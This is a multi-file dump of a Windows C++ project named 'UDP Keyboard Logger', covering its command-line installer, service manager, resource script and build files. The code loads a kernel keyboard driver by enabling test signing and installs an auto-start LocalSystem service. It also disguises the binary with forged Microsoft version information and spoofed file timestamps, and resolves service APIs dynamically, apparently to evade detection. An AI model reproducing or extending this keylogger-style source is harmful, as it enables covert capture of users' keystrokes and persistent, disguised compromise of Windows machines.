    if (command == L"driver-install") {
        LOG_INFO(L"Installing driver and library...");
        bool success = DriverInstaller::InstallDriverAndLibrary();
        if (success) {
            LOG_SUCCESS(L"Driver installation completed successfully");
        } else {
            LOG_ERROR(L"Driver installation failed");
        }
        return success ? 0 : 1;
    }

    else if (command == L"driver-uninstall") {
        LOG_INFO(L"Uninstalling driver and library...");
        bool success = DriverInstaller::UninstallDriverAndLibrary();
        if (success) {
            LOG_SUCCESS(L"Driver uninstallation completed successfully");
        } else {
            LOG_ERROR(L"Driver uninstallation failed");
        }
        return success ? 0 : 1;
    }
    
    // ====================================================================
    // FULL SYSTEM STATUS COMMAND
    // ====================================================================
    
    else if (command == L"status") {
        std::wcout << L"\n=== UDP Keyboard Logger - Full System Status ===" << std::endl;
        std::wcout << std::endl;
        
        auto components = SystemStatus::CheckAllComponents();
        
        int issuesCount = 0;
        for (const auto& component : components) {
            std::wcout << (component.status ? L"[+]" : L"[-]");
            std::wcout << L" " << component.name << L": " << component.details << std::endl;
            if (!component.status) {
                issuesCount++;
                if (!component.fixHint.empty()) {
                    std::wcout << L"    → " << component.fixHint << std::endl;
                }
            }
        }
        
        std::wcout << std::endl;
        if (issuesCount == 0) {
            std::wcout << L"Overall Status: FULLY OPERATIONAL" << std::endl;
        } else {
            std::wcout << L"Overall Status: PARTIALLY OPERATIONAL" << std::endl;
            std::wcout << L"Issues detected: " << issuesCount << std::endl;
        }
        
        return 0;
    }
	    // ====================================================================
    // SERVICE MANAGEMENT COMMANDS
    // ====================================================================
    
    else if (command == L"install") {
        wchar_t exePath[MAX_PATH];
        if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
            LOG_ERROR(L"Failed to get current executable path");
            return 1;
        }
        
        // Check for --reboot flag
        bool autoReboot = false;
        if (argc >= 3 && wcscmp(argv[2], L"--reboot") == 0) {
            autoReboot = true;
        }
        
        LOG_INFO(L"Installing UDP Keyboard Logger (full installation)...");
        
        // Step 1: Install drivers and library
        LOG_INFO(L"Step 1/6: Installing drivers...");
        if (!DriverInstaller::InstallDriverAndLibrary()) {
            LOG_ERROR(L"Driver installation failed");
            return 1;
        }
        LOG_SUCCESS(L"Drivers installed");
        
        // Step 2: Install registry keys
        LOG_INFO(L"Step 2/6: Installing registry keys...");
        if (!DriverInstaller::InstallRegistryKeys()) {
            LOG_ERROR(L"Registry installation failed");
            return 1;
        }
        LOG_SUCCESS(L"Registry keys installed");
        
        // Step 3: Enable test signing
        LOG_INFO(L"Step 3/6: Enabling test signing...");
        if (!DriverInstaller::EnableTestSigning()) {
            LOG_ERROR(L"Test signing configuration failed");
            return 1;
        }
        LOG_SUCCESS(L"Test signing enabled (reboot required)");
        
        // Step 4: Register driver service
        LOG_INFO(L"Step 4/6: Registering driver service...");
        if (!DriverInstaller::InstallDriverService()) {
            LOG_ERROR(L"Driver service registration failed");
            return 1;
        }
        LOG_SUCCESS(L"Driver service registered (reboot required)");
        
        // Step 5: Install Windows service
        LOG_INFO(L"Step 5/6: Installing Windows service...");
        if (!UdpServiceManager::InstallService(exePath)) {
            LOG_ERROR(L"Service installation failed");
            return 1;
        }
        LOG_SUCCESS(L"Service installed");
        
        // Step 6: Start service
        LOG_INFO(L"Step 6/6: Starting service...");
        if (UdpServiceManager::StartServiceProcess()) {
            LOG_SUCCESS(L"Service started");
        } else {
            LOG_ERROR(L"Service installed but failed to start");
        }
        
        LOG_SUCCESS(L"Full installation completed successfully");
        
        // Handle reboot
        PromptAndReboot(autoReboot);
        
        return 0;
    }
    
    else if (command == L"uninstall") {
        LOG_INFO(L"Uninstalling UDP Keyboard Logger (complete removal)...");
        
        // Step 1: Stop service
        LOG_INFO(L"Step 1/6: Stopping service...");
        UdpServiceManager::StopServiceProcess();
        LOG_SUCCESS(L"Service stopped");
        
        // Step 2: Uninstall service
        LOG_INFO(L"Step 2/6: Uninstalling Windows service...");
        if (!UdpServiceManager::UninstallService()) {
            LOG_ERROR(L"Service uninstallation failed");
        } else {
            LOG_SUCCESS(L"Service uninstalled");
        }
        
        // Step 3: Restore registry keys
        LOG_INFO(L"Step 3/6: Restoring registry keys...");
        if (!DriverInstaller::UninstallRegistryKeys()) {
            LOG_ERROR(L"Registry restoration failed");
        } else {
            LOG_SUCCESS(L"Registry keys restored");
        }
        
        // Step 4: Disable test signing
        LOG_INFO(L"Step 4/6: Disabling test signing...");
        if (!DriverInstaller::DisableTestSigning()) {
            LOG_ERROR(L"Test signing restoration failed");
        } else {
            LOG_SUCCESS(L"Test signing disabled (reboot required)");
        }
        
        // Step 5: Unregister driver service
        LOG_INFO(L"Step 5/6: Unregistering driver service...");
        if (!DriverInstaller::UninstallDriverService()) {
            LOG_ERROR(L"Driver service unregistration failed");
        } else {
            LOG_SUCCESS(L"Driver service unregistered");
        }
        
        // Step 6: Uninstall drivers
        LOG_INFO(L"Step 6/6: Uninstalling drivers...");
        if (!DriverInstaller::UninstallDriverAndLibrary()) {
            LOG_ERROR(L"Driver uninstallation failed");
        } else {
            LOG_SUCCESS(L"Drivers uninstalled");
        }
        
        LOG_SUCCESS(L"Complete uninstallation finished");
        
        // Reboot recommendation (not required)
        wprintf(L"\n");
        LOG_INFO(L"System reboot is RECOMMENDED to complete removal.");
        
        return 0;
    }
    
    else if (command == L"service") {
        if (argc < 3) {
            LOG_ERROR(L"Missing service command: start, stop, restart, status");
            return 1;
        }
        
        std::wstring subCmd = argv[2];
        
        if (subCmd == L"start") {
            LOG_INFO(L"Starting UDP Keyboard Logger service...");
            bool result = UdpServiceManager::StartServiceProcess();
            if (result) {
                std::wcout << L"[+] Service started successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to start service" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"stop") {
            LOG_INFO(L"Stopping UDP Keyboard Logger service...");
            bool result = UdpServiceManager::StopServiceProcess();
            if (result) {
                std::wcout << L"[+] Service stopped successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to stop service" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"restart") {
            LOG_INFO(L"Restarting UDP Keyboard Logger service...");
            
            LOG_INFO(L"Stopping service...");
            bool stopped = UdpServiceManager::StopServiceProcess();
            if (stopped) {
                std::wcout << L"[+] Service stopped" << std::endl;
            } else {
                std::wcout << L"[-] Failed to stop service" << std::endl;
            }
            
            Sleep(1000);
            
            LOG_INFO(L"Starting service...");
            bool started = UdpServiceManager::StartServiceProcess();
            if (started) {
                std::wcout << L"[+] Service started" << std::endl;
            } else {
                std::wcout << L"[-] Failed to start service" << std::endl;
            }
            
            return (stopped && started) ? 0 : 1;
            
        } else if (subCmd == L"status") {
            LOG_INFO(L"Checking UDP Keyboard Logger service status...");
            
            const bool installed = UdpServiceManager::IsServiceInstalled();
            const bool running = installed ? UdpServiceManager::IsServiceRunning() : false;
            
            std::wcout << L"\n=== Windows Service Status ===" << std::endl;
            std::wcout << L"Name: UdpKeyboardLogger" << std::endl;
            std::wcout << L"Display Name: UDP Keyboard Logger Service" << std::endl;
            std::wcout << std::endl;
            
            if (installed) {
                std::wcout << (running ? L"[+]" : L"[-]");
                std::wcout << L" Installation Status: INSTALLED" << std::endl;
                std::wcout << (running ? L"[+]" : L"[-]"); 
                std::wcout << L" Runtime Status: " << (running ? L"RUNNING" : L"STOPPED") << std::endl;
                
                if (running) {
                    std::wcout << L"[+] Service is operational and logging UDP keyboard input" << std::endl;
                } else {
                    std::wcout << L"    → Use 'UdpLogger service start' to start the service" << std::endl;
                }
            } else {
                std::wcout << L"[-] Installation Status: NOT INSTALLED" << std::endl;
                std::wcout << L"    → Use 'UdpLogger install' to install the service first" << std::endl;
            }
            
            std::wcout << std::endl;
            return 0;
            
        } else {
            LOG_ERROR(L"Unknown service command: %s", subCmd.c_str());
            PrintUsage();
            return 1;
        }
    }
    
    // ====================================================================
    // DRIVER MANAGEMENT COMMANDS
    // ====================================================================
    
    else if (command == L"driver") {
        if (argc < 3) {
            LOG_ERROR(L"Missing driver command: start, stop, restart, status");
            return 1;
        }
        
        std::wstring subCmd = argv[2];
        
        if (subCmd == L"start") {
            LOG_INFO(L"Starting kvckbd kernel driver...");
            bool result = UdpServiceManager::StartDriverService();
            if (result) {
                std::wcout << L"[+] Driver started successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to start driver" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"stop") {
            LOG_INFO(L"Stopping kvckbd kernel driver...");
            bool result = UdpServiceManager::StopDriverService();
            if (result) {
                std::wcout << L"[+] Driver stopped successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to stop driver" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"restart") {
            LOG_INFO(L"Restarting kvckbd kernel driver...");
            bool result = UdpServiceManager::RestartDriverService();
            if (result) {
                std::wcout << L"[+] Driver restarted successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to restart driver" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"status") {
            bool isRunning = UdpServiceManager::IsDriverServiceRunning();
            std::wcout << L"\n=== Kernel Driver Status ===" << std::endl;
            std::wcout << L"Driver: kvckbd.sys" << std::endl;
            std::wcout << L"Status: " << (isRunning ? L"RUNNING" : L"STOPPED") << std::endl;
            std::wcout << std::endl;
            
            if (isRunning) {
                std::wcout << L"[+] Driver is loaded and operational" << std::endl;
            } else {
                std::wcout << L"[-] Driver is not running" << std::endl;
                std::wcout << L"    → Run 'UdpLogger driver start' to start it" << std::endl;
            }
            return 0;
            
        } else {
            LOG_ERROR(L"Unknown driver command: %s", subCmd.c_str());
            PrintUsage();
            return 1;
        }
    }
    
    else {
        LOG_ERROR(L"Unknown command: %s", command.c_str());
        PrintUsage();
        return 1;
    }
    
    return 0;
}


================================================================================
 FILE: UdpLogger\UdpLogger.rc
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-09 13:21:05
 File size     : 4.64 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US


/////////////////////////////////////////////////////////////////////////////
//
// Icon
//

// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON1               ICON                    "ICON\\kvc.ico"
IDR_MAINICON            RCDATA                  "ICON\\kvc.ico"

/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,0,0,1
 PRODUCTVERSION 1,0,0,1
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "Microsoft Corporation"
            VALUE "FileDescription", "Windows System Utility"
            VALUE "FileVersion", "10.0.26200.8460"
            VALUE "InternalName", "UdpLogger.exe"
            VALUE "LegalCopyright", "© Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "UdpLogger.exe"
            VALUE "ProductName", "Microsoft® Windows® Operating System"
            VALUE "ProductVersion", "10.0.26200.8460"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED



================================================================================
 FILE: UdpLogger\UdpLogger.vcxproj
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 09:38:43
 File size     : 6.36 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{fdf52128-78ae-4d88-9711-ce933ac2724b}</ProjectGuid>
    <RootNamespace>UdpLogger</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
<ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
  <ClCompile>
    <WarningLevel>Level3</WarningLevel>
    <FunctionLevelLinking>true</FunctionLevelLinking>
    <IntrinsicFunctions>true</IntrinsicFunctions>
    <SDLCheck>false</SDLCheck>
    <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    <ConformanceMode>true</ConformanceMode>
    <LanguageStandard>stdcpplatest</LanguageStandard>
    <BufferSecurityCheck>false</BufferSecurityCheck>
    <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
    <Optimization>MinSpace</Optimization>
    <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
    <AdditionalOptions>/utf-8 /GS- /Gy /Gw /Brepro %(AdditionalOptions)</AdditionalOptions>
  </ClCompile>
  <Link>
    <SubSystem>Console</SubSystem>
    <EnableCOMDATFolding>true</EnableCOMDATFolding>
    <OptimizeReferences>true</OptimizeReferences>
    <GenerateDebugInformation>false</GenerateDebugInformation>
    <AdditionalOptions>/OPT:REF /OPT:ICF=5 /MERGE:.rdata=.text /MERGE:.pdata=.text /NXCOMPAT /INCREMENTAL:NO /Brepro %(AdditionalOptions)</AdditionalOptions>
  </Link>
</ItemDefinitionGroup>
<ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
  <ClCompile>
    <WarningLevel>Level3</WarningLevel>
    <FunctionLevelLinking>true</FunctionLevelLinking>
    <IntrinsicFunctions>true</IntrinsicFunctions>
    <SDLCheck>false</SDLCheck>
    <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    <ConformanceMode>true</ConformanceMode>
    <LanguageStandard>stdcpplatest</LanguageStandard>
    <BufferSecurityCheck>false</BufferSecurityCheck>
    <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
    <Optimization>MinSpace</Optimization>
    <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
					<OmitFramePointers>true</OmitFramePointers>
					<EnablePREfast>false</EnablePREfast>
    <AdditionalOptions>/utf-8 /GS- /Gy /Gw /Brepro %(AdditionalOptions)</AdditionalOptions>
  </ClCompile>
  <Link>
    <SubSystem>Console</SubSystem>
    <EnableCOMDATFolding>true</EnableCOMDATFolding>
    <OptimizeReferences>true</OptimizeReferences>
    <GenerateDebugInformation>false</GenerateDebugInformation>
    <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
    <AdditionalOptions>/OPT:REF /OPT:ICF=5 /MERGE:.rdata=.text /MERGE:.pdata=.text /NXCOMPAT /INCREMENTAL:NO /Brepro %(AdditionalOptions)</AdditionalOptions>
  </Link>
  <PostBuildEvent>
    <Command>powershell -Command "&amp; {$f='$(OutDir)$(TargetName)$(TargetExt)'; (Get-Item $f).CreationTime='2026-01-01 00:00:00'; (Get-Item $f).LastWriteTime='2026-01-01 00:00:00'}"</Command>
  </PostBuildEvent>
</ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="TrustedInstallerExecutor.cpp" />
	<ClCompile Include="DriverInstaller.cpp" />
	<ClCompile Include="ResourceExtractor.cpp" />
    <ClCompile Include="FileLogger.cpp" />
    <ClCompile Include="UdpLogger.cpp" />
    <ClCompile Include="UdpListener.cpp" />
    <ClCompile Include="UdpServiceManager.cpp" />
    <ClCompile Include="SystemStatus.cpp" />
    <ClCompile Include="PathHelper.cpp" />	
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="config.h" />
    <ClInclude Include="TrustedInstallerExecutor.h" />
	<ClInclude Include="DriverInstaller.h" />
	<ClInclude Include="ResourceExtractor.h" />
    <ClInclude Include="FileLogger.h" />
    <ClInclude Include="resource.h" />
    <ClInclude Include="UdpListener.h" />
    <ClInclude Include="UdpServiceManager.h" />
	<ClInclude Include="SystemStatus.h" />
    <ClInclude Include="PathHelper.h" />
	<ClInclude Include="DebugConfig.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="UdpLogger.rc" />
  </ItemGroup>
  <ItemGroup>
    <Image Include="ICON\kvc.ico" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>


================================================================================
 FILE: UdpLogger\UdpLogger.vcxproj.filters
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 09:40:48
 File size     : 3.08 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
<ItemGroup>
    <ClCompile Include="DriverInstaller.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FileLogger.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="PathHelper.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ResourceExtractor.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SystemStatus.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="TrustedInstallerExecutor.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UdpListener.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UdpLogger.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UdpServiceManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Config.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DebugConfig.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DriverInstaller.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FileLogger.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PathHelper.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ResourceExtractor.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SystemStatus.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="TrustedInstallerExecutor.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UdpListener.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UdpServiceManager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="UdpLogger.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <Image Include="ICON\kvc.ico">
      <Filter>Resource Files</Filter>
    </Image>
  </ItemGroup>
</Project>


================================================================================
 FILE: UdpLogger\UdpServiceManager.cpp
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 10:01:59
 File size     : 18.69 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#include "UdpServiceManager.h"
#include "UdpListener.h"
#include "FileLogger.h"
#include "config.h"
#include "PathHelper.h"
#include <iostream>
#include <memory>
#include <chrono>

// Service static members
SERVICE_STATUS_HANDLE UdpServiceManager::s_serviceStatusHandle = nullptr;
SERVICE_STATUS UdpServiceManager::s_serviceStatus = {};
HANDLE UdpServiceManager::s_serviceStopEvent = nullptr;
volatile bool UdpServiceManager::s_serviceRunning = false;

// Dynamic API pointers
decltype(&::OpenServiceW) UdpServiceManager::g_pOpenServiceW = nullptr;
decltype(&::CreateServiceW) UdpServiceManager::g_pCreateServiceW = nullptr;
decltype(&::DeleteService) UdpServiceManager::g_pDeleteService = nullptr;
decltype(&::StartServiceW) UdpServiceManager::g_pStartServiceW = nullptr;
decltype(&::ControlService) UdpServiceManager::g_pControlService = nullptr;
decltype(&::QueryServiceStatus) UdpServiceManager::g_pQueryServiceStatus = nullptr;

// Global service components
static std::unique_ptr<FileLogger> g_serviceLogger = nullptr;
static std::unique_ptr<UdpListener> g_udpListener = nullptr;
static std::chrono::steady_clock::time_point g_lastActivity;
static bool g_headerWritten = false;
static std::string g_firstClientAddress;

bool UdpServiceManager::InitDynamicAPIs() noexcept {
    static bool initialized = false;
    if (initialized) return true;
    
    HMODULE hAdvapi32 = GetModuleHandleW(L"advapi32.dll");
    if (!hAdvapi32) {
        hAdvapi32 = LoadLibraryW(L"advapi32.dll");
        if (!hAdvapi32) return false;
    }
    
    g_pOpenServiceW = reinterpret_cast<decltype(g_pOpenServiceW)>(GetProcAddress(hAdvapi32, "OpenServiceW"));
    g_pCreateServiceW = reinterpret_cast<decltype(g_pCreateServiceW)>(GetProcAddress(hAdvapi32, "CreateServiceW"));
    g_pDeleteService = reinterpret_cast<decltype(g_pDeleteService)>(GetProcAddress(hAdvapi32, "DeleteService"));
    g_pStartServiceW = reinterpret_cast<decltype(g_pStartServiceW)>(GetProcAddress(hAdvapi32, "StartServiceW"));
    g_pControlService = reinterpret_cast<decltype(g_pControlService)>(GetProcAddress(hAdvapi32, "ControlService"));
    g_pQueryServiceStatus = reinterpret_cast<decltype(g_pQueryServiceStatus)>(GetProcAddress(hAdvapi32, "QueryServiceStatus"));
    
    initialized = (g_pOpenServiceW && g_pCreateServiceW && g_pDeleteService && 
                   g_pStartServiceW && g_pControlService && g_pQueryServiceStatus);
    
    return initialized;
}

bool UdpServiceManager::InstallService(const std::wstring& exePath) noexcept {
    if (!InitDynamicAPIs()) {
        std::wcerr << L"Failed to initialize service APIs" << std::endl;
        return false;
    }
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        std::wcerr << L"Failed to open Service Control Manager: " << GetLastError() << std::endl;
        return false;
    }
    
    // Build service command line with --service parameter
    std::wstring servicePath = L"\"" + exePath + L"\" --service";
    
    SC_HANDLE hService = g_pCreateServiceW(
        hSCM,
        ServiceConstants::SERVICE_NAME,
        ServiceConstants::SERVICE_DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        servicePath.c_str(),
        nullptr, nullptr, nullptr,
        nullptr, // LocalSystem account
        nullptr
    );
    
    if (!hService) {
        DWORD error = GetLastError();
        CloseServiceHandle(hSCM);
        
        if (error == ERROR_SERVICE_EXISTS) {
            std::wcout << L"Service already exists, attempting to update configuration..." << std::endl;
            
            hService = g_pOpenServiceW(hSCM, ServiceConstants::SERVICE_NAME, SERVICE_CHANGE_CONFIG);
            if (hService) {
                BOOL success = ChangeServiceConfigW(
                    hService,
                    SERVICE_WIN32_OWN_PROCESS,
                    SERVICE_AUTO_START,
                    SERVICE_ERROR_NORMAL,
                    servicePath.c_str(),
                    nullptr, nullptr, nullptr, nullptr, nullptr,
                    ServiceConstants::SERVICE_DISPLAY_NAME
                );
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                
                if (success) {
                    std::wcout << L"Service configuration updated successfully" << std::endl;
                    return true;
                } else {
                    std::wcerr << L"Failed to update service configuration: " << GetLastError() << std::endl;
                    return false;
                }
            }
            return false;
        }
        
        std::wcerr << L"Failed to create service: " << error << std::endl;
        return false;
    }
    
    // Set service description
    SERVICE_DESCRIPTIONW serviceDesc = {};
    serviceDesc.lpDescription = const_cast<wchar_t*>(ServiceConstants::SERVICE_DESCRIPTION);
    ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &serviceDesc);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    std::wcout << L"Service '" << ServiceConstants::SERVICE_DISPLAY_NAME << L"' installed successfully" << std::endl;
    
    // Attempt to start the service
    if (StartServiceProcess()) {
        std::wcout << L"Service started successfully" << std::endl;
    } else {
        std::wcout << L"Service installed but failed to start automatically" << std::endl;
    }
    
    return true;
}

bool UdpServiceManager::UninstallService() noexcept {
    if (!InitDynamicAPIs()) {
        std::wcerr << L"Failed to initialize service APIs" << std::endl;
        return false;
    }
    
    // First try to stop the service
    StopServiceProcess();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) {
        std::wcerr << L"Failed to open Service Control Manager: " << GetLastError() << std::endl;
        return false;
    }
    
    SC_HANDLE hService = g_pOpenServiceW(hSCM, ServiceConstants::SERVICE_NAME, DELETE);
    if (!hService) {
        DWORD error = GetLastError();
        CloseServiceHandle(hSCM);
        
        if (error == ERROR_SERVICE_DOES_NOT_EXIST) {
            std::wcout << L"Service does not exist" << std::endl;
            return true;
        }
        
        std::wcerr << L"Failed to open service for deletion: " << error << std::endl;
        return false;
    }
    
    BOOL success = g_pDeleteService(hService);
    DWORD error = GetLastError();
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    if (!success) {
        if (error == ERROR_SERVICE_MARKED_FOR_DELETE) {
            std::wcout << L"Service marked for deletion (will be removed after next reboot)" << std::endl;
            return true;
        }
        std::wcerr << L"Failed to delete service: " << error << std::endl;
        return false;
    }
    
    std::wcout << L"Service '" << ServiceConstants::SERVICE_DISPLAY_NAME << L"' uninstalled successfully" << std::endl;
    return true;
}

bool UdpServiceManager::StartServiceProcess() noexcept {
    if (!InitDynamicAPIs()) return false;
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;
    
    SC_HANDLE hService = g_pOpenServiceW(hSCM, ServiceConstants::SERVICE_NAME, SERVICE_START);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    BOOL success = g_pStartServiceW(hService, 0, nullptr);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    return success || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
}

bool UdpServiceManager::StopServiceProcess() noexcept {
    if (!InitDynamicAPIs()) return false;
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
